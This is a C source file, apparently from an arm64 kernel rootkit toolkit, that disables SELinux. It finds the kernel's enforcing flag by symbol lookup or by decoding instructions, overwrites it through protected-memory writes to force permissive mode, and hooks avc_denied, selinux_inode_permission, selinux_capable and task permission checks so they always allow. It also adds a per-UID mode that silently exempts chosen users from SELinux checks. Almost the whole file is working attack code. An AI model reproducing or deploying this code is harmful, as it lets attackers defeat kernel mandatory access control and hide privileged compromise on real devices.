/* SPDX-License-Identifier: GPL-2.0 */
#include <nvk.h>
#include <nvk_internal.h>

static volatile int *_neverc_krt_selinux_enforcing;

static struct neverc_krt_interpose _neverc_krt_avc_interpose;
static struct neverc_krt_interpose _neverc_krt_inode_interpose;
static struct neverc_krt_interpose _neverc_krt_task_perm_interpose;
static struct neverc_krt_interpose _neverc_krt_cred_perm_interpose;

/* ---- internal helpers ---- */

static __always_inline u32 _neverc_krt_se_current_uid(void)
{
	unsigned long task;
	__asm__ __volatile__("mrs %0, sp_el0" : "=r"(task));

	unsigned long cred_off =
		__atomic_load_n(&_neverc_krt_off_cred, __ATOMIC_ACQUIRE);
	if (!cred_off) return 0xFFFFFFFFU;

	unsigned long cred_ptr;
	if (neverc_krt_mem_read(&cred_ptr, (void *)(task + cred_off), 8))
		return 0xFFFFFFFFU;
	cred_ptr &= ~(0xFFUL << 56);
	if (cred_ptr < 0xFFFF000000000000UL) return 0xFFFFFFFFU;

	unsigned long uid_off =
		__atomic_load_n(&_neverc_krt_off_uid, __ATOMIC_ACQUIRE);
	if (!uid_off) uid_off = _neverc_krt_cred_uid_base();
	u32 uid = 0xFFFFFFFFU;
	neverc_krt_mem_read(&uid, (void *)(cred_ptr + uid_off), 4);
	return uid;
}

/* ---- internal typedefs ---- */

typedef long (*neverc_krt_selinux_generic_fn)(void);
typedef int  (*neverc_krt_inode_permission_fn)(void *inode, int mask);

/* ---- internal structs ---- */

struct neverc_krt_se_uid_entry {
	u32  uid;
	u32  flags;
	volatile int active;
};

struct neverc_krt_se_selective {
	struct neverc_krt_se_uid_entry uids[NEVERC_KRT_SE_UID_MAX];
	int count;
	struct neverc_krt_interpose avc_interpose;
	struct neverc_krt_interpose inode_interpose;
	struct neverc_krt_interpose capable_interpose;
	int active;
};

/* ---- internal variables (file-local) ---- */

static int                        _neverc_krt_selinux_inited;
static int                        _neverc_krt_se_method;

static neverc_krt_selinux_generic_fn  _neverc_krt_orig_avc;
static neverc_krt_inode_permission_fn _neverc_krt_orig_inode_perm;
static neverc_krt_selinux_generic_fn  _neverc_krt_orig_task_perm;
static neverc_krt_selinux_generic_fn  _neverc_krt_orig_cred_perm;
static unsigned long                  _neverc_krt_se_patched_addr;

static struct neverc_krt_se_selective _neverc_krt_se_sel;
static neverc_krt_selinux_generic_fn  _neverc_krt_sel_orig_avc;
static neverc_krt_inode_permission_fn _neverc_krt_sel_orig_inode;
static neverc_krt_selinux_generic_fn  _neverc_krt_sel_orig_capable;

volatile int *_neverc_krt_se_probe_state(void *se_state)
{
	const unsigned char *p = (const unsigned char *)se_state;
	unsigned long i;

	for (i = 0; i < 64; i += 4) {
		int v0, v1;
		if (neverc_krt_mem_read(&v0, p + i, 4)) continue;
		if (neverc_krt_mem_read(&v1, p + i + 4, 4)) continue;
		if (v0 == 1 && (v1 == 0 || v1 == 1))
			return (volatile int *)(p + i + 4);
		if (i == 0 && (v0 == 0 || v0 == 1)) {
			int v2;
			if (!neverc_krt_mem_read(&v2, p + 4, 4) && v2 == 1)
				return (volatile int *)p;
		}
	}
	return (volatile int *)0;
}

static volatile int *_neverc_krt_se_probe_fn(void)
{
	void *fn = NEVERC_KRT_LOOKUP("enforcing_setup");
	if (!fn) fn = NEVERC_KRT_LOOKUP("sel_read_enforce");
	if (!fn) return (volatile int *)0;

	u32 *code = (u32 *)fn;
	int i;
	for (i = 0; i < 32; i++) {
		u32 insn;
		if (neverc_krt_mem_read(&insn, &code[i], 4))
			break;
		if ((insn & 0x9F000000) == 0x90000000) {
			int rd = insn & 0x1F;
			int immlo = (insn >> 29) & 3;
			long immhi = _neverc_krt_sext((insn >> 5) & 0x7FFFF, 19);
			unsigned long page = ((unsigned long)&code[i] & ~0xFFFUL)
					     + (((immhi << 2) | immlo) << 12);
			if (i + 1 < 32) {
				u32 next;
				if (neverc_krt_mem_read(&next, &code[i + 1], 4))
					break;
				if ((next & 0xFFC003E0) == (0xB9400000U | (rd << 5))) {
					unsigned long imm12 =
						((next >> 10) & 0xFFF) << 2;
					unsigned long addr = page + imm12;
					if (addr > 0xFFFF000000000000UL) {
						int v;
						if (!neverc_krt_mem_read(&v, (void *)addr, 4) &&
						    (v == 0 || v == 1))
							return (volatile int *)addr;
					}
				}
				if ((next & 0xFFC003E0) == (0x91000000U | ((u32)rd << 5) | rd)) {
					unsigned long imm12 =
						((next >> 10) & 0xFFF);
					unsigned long addr = page + imm12;
					if (addr > 0xFFFF000000000000UL) {
						int v;
						if (!neverc_krt_mem_read(&v, (void *)addr, 4) &&
						    (v == 0 || v == 1))
							return (volatile int *)addr;
					}
				}
			}
		}
	}
	return (volatile int *)0;
}

int neverc_krt_selinux_is_enforcing(void)
{
	if (!_neverc_krt_selinux_enforcing) return -1;
	return __atomic_load_n(_neverc_krt_selinux_enforcing, __ATOMIC_ACQUIRE);
}

int neverc_krt_selinux_init(void)
{
	if (_neverc_krt_selinux_inited) return 0;

	neverc_krt_mem_init();

	_neverc_krt_selinux_enforcing =
		(volatile int *)NEVERC_KRT_LOOKUP("selinux_enforcing");
	if (_neverc_krt_selinux_enforcing) {
		_neverc_krt_se_method = 1;
		_neverc_krt_selinux_inited = 1;
		return 0;
	}

	void *se_state = NEVERC_KRT_LOOKUP("selinux_state");
	if (se_state) {
		_neverc_krt_selinux_enforcing = _neverc_krt_se_probe_state(se_state);
		if (_neverc_krt_selinux_enforcing) {
			_neverc_krt_se_method = 2;
			_neverc_krt_selinux_inited = 1;
			return 0;
		}
	}

	_neverc_krt_selinux_enforcing = _neverc_krt_se_probe_fn();
	if (_neverc_krt_selinux_enforcing) {
		_neverc_krt_se_method = 3;
		_neverc_krt_selinux_inited = 1;
		return 0;
	}

	_neverc_krt_selinux_inited = 1;
	return -1;
}

static int _neverc_krt_se_write(volatile int *addr, int val)
{
	return neverc_krt_mem_write_protected((unsigned long)addr, &val, 4);
}

int neverc_krt_selinux_set_permissive(void)
{
	if (!_neverc_krt_selinux_enforcing) return -1;
	return _neverc_krt_se_write(_neverc_krt_selinux_enforcing, 0);
}

int neverc_krt_selinux_set_enforcing(void)
{
	if (!_neverc_krt_selinux_enforcing) return -1;
	return _neverc_krt_se_write(_neverc_krt_selinux_enforcing, 1);
}

static long _neverc_krt_return_zero(void)
{
	return 0;
}

int neverc_krt_selinux_bypass_install(struct neverc_krt_selinux_bypass *state)
{
	void *target;
	int ret;

	state->avc_interposed = 0;
	state->inode_interposed = 0;
	state->task_perm_interposed = 0;
	state->cred_perm_interposed = 0;
	state->state_patched = 0;

	target = NEVERC_KRT_LOOKUP("avc_denied");
	if (target) {
		ret = neverc_krt_interpose_install(&_neverc_krt_avc_interpose, target,
				       (void *)_neverc_krt_return_zero,
				       (void **)&_neverc_krt_orig_avc);
		if (ret == 0)
			state->avc_interposed = 1;
	}

	target = NEVERC_KRT_LOOKUP("selinux_inode_permission");
	if (target) {
		ret = neverc_krt_interpose_install(&_neverc_krt_inode_interpose, target,
				       (void *)_neverc_krt_return_zero,
				       (void **)&_neverc_krt_orig_inode_perm);
		if (ret == 0)
			state->inode_interposed = 1;
	}

	target = NEVERC_KRT_LOOKUP("selinux_task_setpgid");
	if (!target)
		target = NEVERC_KRT_LOOKUP("selinux_task_kill");
	if (target) {
		ret = neverc_krt_interpose_install(&_neverc_krt_task_perm_interpose, target,
				       (void *)_neverc_krt_return_zero,
				       (void **)&_neverc_krt_orig_task_perm);
		if (ret == 0)
			state->task_perm_interposed = 1;
	}

	target = NEVERC_KRT_LOOKUP("selinux_capable");
	if (target) {
		ret = neverc_krt_interpose_install(&_neverc_krt_cred_perm_interpose, target,
				       (void *)_neverc_krt_return_zero,
				       (void **)&_neverc_krt_orig_cred_perm);
		if (ret == 0)
			state->cred_perm_interposed = 1;
	}

	return (state->avc_interposed || state->inode_interposed) ? 0 : -1;
}

int neverc_krt_selinux_patch_state(struct neverc_krt_selinux_bypass *state)
{
	if (!_neverc_krt_selinux_enforcing) return -1;

	int cur = __atomic_load_n(_neverc_krt_selinux_enforcing, __ATOMIC_ACQUIRE);
	state->saved_enforce = cur;

	if (cur == 1) {
		_neverc_krt_se_patched_addr =
			(unsigned long)_neverc_krt_selinux_enforcing;
		neverc_krt_mem_write_protected(_neverc_krt_se_patched_addr,
					&(int){0}, 4);
		state->state_patched = 1;
	}
	return 0;
}

void neverc_krt_selinux_restore_state(struct neverc_krt_selinux_bypass *state)
{
	if (!state->state_patched) return;
	if (!_neverc_krt_se_patched_addr) return;

	neverc_krt_mem_write_protected(_neverc_krt_se_patched_addr,
				&state->saved_enforce, 4);
	state->state_patched = 0;
	_neverc_krt_se_patched_addr = 0;
}

int neverc_krt_selinux_full_bypass(struct neverc_krt_selinux_bypass *state)
{
	int ret;

	ret = neverc_krt_selinux_bypass_install(state);

	neverc_krt_selinux_set_permissive();

	neverc_krt_selinux_patch_state(state);

	return ret;
}

void neverc_krt_selinux_bypass_remove(struct neverc_krt_selinux_bypass *state)
{
	if (state->state_patched)
		neverc_krt_selinux_restore_state(state);

	if (state->cred_perm_interposed) {
		neverc_krt_interpose_remove(&_neverc_krt_cred_perm_interpose);
		state->cred_perm_interposed = 0;
	}
	if (state->task_perm_interposed) {
		neverc_krt_interpose_remove(&_neverc_krt_task_perm_interpose);
		state->task_perm_interposed = 0;
	}
	if (state->inode_interposed) {
		neverc_krt_interpose_remove(&_neverc_krt_inode_interpose);
		state->inode_interposed = 0;
	}
	if (state->avc_interposed) {
		neverc_krt_interpose_remove(&_neverc_krt_avc_interpose);
		state->avc_interposed = 0;
	}
}

static int _neverc_krt_se_uid_allowed(u32 uid, u32 flag)
{
	int i;
	for (i = 0; i < _neverc_krt_se_sel.count; i++) {
		if (!_neverc_krt_se_sel.uids[i].active) continue;
		if (_neverc_krt_se_sel.uids[i].uid == uid &&
		    (_neverc_krt_se_sel.uids[i].flags & flag))
			return 1;
	}
	return 0;
}

int neverc_krt_se_selective_add(u32 uid, u32 flags)
{
	int i;
	for (i = 0; i < _neverc_krt_se_sel.count; i++) {
		if (_neverc_krt_se_sel.uids[i].uid == uid) {
			_neverc_krt_se_sel.uids[i].flags |= flags;
			WRITE_ONCE(_neverc_krt_se_sel.uids[i].active, 1);
			return 0;
		}
	}
	if (_neverc_krt_se_sel.count >= NEVERC_KRT_SE_UID_MAX)
		return -1;
	int slot = _neverc_krt_se_sel.count++;
	_neverc_krt_se_sel.uids[slot].uid = uid;
	_neverc_krt_se_sel.uids[slot].flags = flags;
	__asm__ __volatile__("dmb ish" ::: "memory");
	WRITE_ONCE(_neverc_krt_se_sel.uids[slot].active, 1);
	return 0;
}

int neverc_krt_se_selective_remove(u32 uid)
{
	int i;
	for (i = 0; i < _neverc_krt_se_sel.count; i++) {
		if (_neverc_krt_se_sel.uids[i].uid == uid) {
			WRITE_ONCE(_neverc_krt_se_sel.uids[i].active, 0);
			return 0;
		}
	}
	return -1;
}

static long _neverc_krt_sel_avc_filter(void)
{
	u32 uid = _neverc_krt_se_current_uid();
	if (_neverc_krt_se_uid_allowed(uid, NEVERC_KRT_SE_FLAG_AVC))
		return 0;
	if (_neverc_krt_sel_orig_avc)
		return _neverc_krt_sel_orig_avc();
	return 0;
}

static int _neverc_krt_sel_inode_filter(void *inode, int mask)
{
	u32 uid = _neverc_krt_se_current_uid();
	if (_neverc_krt_se_uid_allowed(uid, NEVERC_KRT_SE_FLAG_INODE))
		return 0;
	if (_neverc_krt_sel_orig_inode)
		return _neverc_krt_sel_orig_inode(inode, mask);
	return 0;
}

static long _neverc_krt_sel_capable_filter(void)
{
	u32 uid = _neverc_krt_se_current_uid();
	if (_neverc_krt_se_uid_allowed(uid, NEVERC_KRT_SE_FLAG_CAPABLE))
		return 0;
	if (_neverc_krt_sel_orig_capable)
		return _neverc_krt_sel_orig_capable();
	return 0;
}

int neverc_krt_se_selective_install(void)
{
	void *target;
	int interposed = 0;

	if (_neverc_krt_se_sel.active) return 0;

	target = NEVERC_KRT_LOOKUP("avc_denied");
	if (target) {
		if (neverc_krt_interpose_install(&_neverc_krt_se_sel.avc_interpose, target,
				     (void *)_neverc_krt_sel_avc_filter,
				     (void **)&_neverc_krt_sel_orig_avc) == 0)
			interposed++;
	}

	target = NEVERC_KRT_LOOKUP("selinux_inode_permission");
	if (target) {
		if (neverc_krt_interpose_install(&_neverc_krt_se_sel.inode_interpose, target,
				     (void *)_neverc_krt_sel_inode_filter,
				     (void **)&_neverc_krt_sel_orig_inode) == 0)
			interposed++;
	}

	target = NEVERC_KRT_LOOKUP("selinux_capable");
	if (target) {
		if (neverc_krt_interpose_install(&_neverc_krt_se_sel.capable_interpose, target,
				     (void *)_neverc_krt_sel_capable_filter,
				     (void **)&_neverc_krt_sel_orig_capable) == 0)
			interposed++;
	}

	_neverc_krt_se_sel.active = 1;
	return interposed > 0 ? 0 : -1;
}

void neverc_krt_se_selective_cleanup(void)
{
	if (!_neverc_krt_se_sel.active) return;

	if (_neverc_krt_se_sel.capable_interpose.active)
		neverc_krt_interpose_remove(&_neverc_krt_se_sel.capable_interpose);
	if (_neverc_krt_se_sel.inode_interpose.active)
		neverc_krt_interpose_remove(&_neverc_krt_se_sel.inode_interpose);
	if (_neverc_krt_se_sel.avc_interpose.active)
		neverc_krt_interpose_remove(&_neverc_krt_se_sel.avc_interpose);

	_neverc_krt_se_sel.active = 0;
	_neverc_krt_se_sel.count = 0;
}

void neverc_krt_selinux_pause_interposes(void)
{
	if (_neverc_krt_avc_interpose.active)
		neverc_krt_interpose_pause(&_neverc_krt_avc_interpose);
	if (_neverc_krt_inode_interpose.active)
		neverc_krt_interpose_pause(&_neverc_krt_inode_interpose);
	if (_neverc_krt_task_perm_interpose.active)
		neverc_krt_interpose_pause(&_neverc_krt_task_perm_interpose);
	if (_neverc_krt_cred_perm_interpose.active)
		neverc_krt_interpose_pause(&_neverc_krt_cred_perm_interpose);
}

void neverc_krt_selinux_remove_interposes(void)
{
	if (_neverc_krt_cred_perm_interpose.active)
		neverc_krt_interpose_remove(&_neverc_krt_cred_perm_interpose);
	if (_neverc_krt_task_perm_interpose.active)
		neverc_krt_interpose_remove(&_neverc_krt_task_perm_interpose);
	if (_neverc_krt_inode_interpose.active)
		neverc_krt_interpose_remove(&_neverc_krt_inode_interpose);
	if (_neverc_krt_avc_interpose.active)
		neverc_krt_interpose_remove(&_neverc_krt_avc_interpose);
}

